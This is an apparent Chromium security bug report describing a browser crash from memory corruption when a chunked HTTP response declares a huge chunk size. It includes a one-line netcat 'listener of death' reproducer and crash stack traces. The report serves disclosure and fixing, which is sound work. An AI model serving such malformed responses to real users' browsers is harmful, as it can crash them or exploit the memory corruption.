<title>Issue 14508 -   chromium -    Security: browser crash with memmove() memory corruption upon large chunked encoding chunk size - Project Hosting on Google Code</title> <pre> To reproduce  run this &quot;listener of death&quot; from a Linux command line:    echo -ne 'HTTP/1.1 200 OKrnTransfer-Encoding:  chunkedrnrnffff0000rnhellorn' | nc -l -p 8080 localhost    (I can likely host this on App Engine if required).    And then point Chrome at http://localhost:8080/    The browser will go down immediately. It's memory errors so this will need  to go out as a Severity: Critical security update.    Various crash dumps are triggering this in the wild at a rate of many per  day  so fixing this is a useful stability boost too.    Most usual symptom is:  Thread 5 *CRASHED* (EXCEPTION_ACCESS_VIOLATION @0x004bfffe)  0x6a6b140a 	[chrome.dll 	- string_piece.cc:54]   StringPiece::find(char unsigned int)  0x6a4f3872 	[chrome.dll 	- http_chunked_decoder.cc:96]   net::HttpChunkedDecoder::ScanForChunkRemaining(char const * int)  0x6a4f3825 	[chrome.dll 	- http_chunked_decoder.cc:78]   net::HttpChunkedDecoder::FilterBuf(char * int)  0x6a4e18b9 	[chrome.dll 	- http_network_transaction.cc:851]   net::HttpNetworkTransaction::DoReadBodyComplete(int)  0x6a4e0e2f 	[chrome.dll 	- http_network_transaction.cc:467]   net::HttpNetworkTransaction::DoLoop(int)  0x6a4e0734 	[chrome.dll 	- http_network_transaction.cc:376]   net::HttpNetworkTransaction::OnIOComplete(int)     However a less usual symptom illustrates the severity:  Thread 6 *CRASHED* (EXCEPTION_ACCESS_VIOLATION @0x00ac8000)  0x0221edca 	[chrome.dll 	- MEMCPY.ASM:188] 	memmove  0x01e1383a 	[chrome.dll 	- http_chunked_decoder.cc:84]   net::HttpChunkedDecoder::FilterBuf(char * int)  0x01e018b9 	[chrome.dll 	- http_network_transaction.cc:851]   net::HttpNetworkTransaction::DoReadBodyComplete(int)  0x01e00e2f 	[chrome.dll 	- http_network_transaction.cc:467]   net::HttpNetworkTransaction::DoLoop(int)    The root cause is a signedness error. Note that although the code lineage  is from Mozilla  Mozilla is not affected because it uses unsigned types in  its version.    I don't yet have a chromium.org account. Due to the severity of the issue   I'd like help landing the patch I'm about to upload. </pre>
